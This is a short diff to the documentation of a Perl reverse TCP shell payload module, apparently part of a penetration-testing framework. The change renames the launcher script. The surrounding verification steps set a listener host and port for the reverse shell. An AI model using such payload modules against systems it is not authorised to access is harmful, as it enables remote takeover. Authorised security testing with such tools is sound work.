@@ -4,7 +4,7 @@ Module generates payload that creates interactive tcp reverse shell by using per
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./fxf.py`
   2. Do: `use payloads/cmd/perl_reverse_tcp`
   3. Do: `set lhost 192.168.1.3`
   4. Do: `set lport 4321`
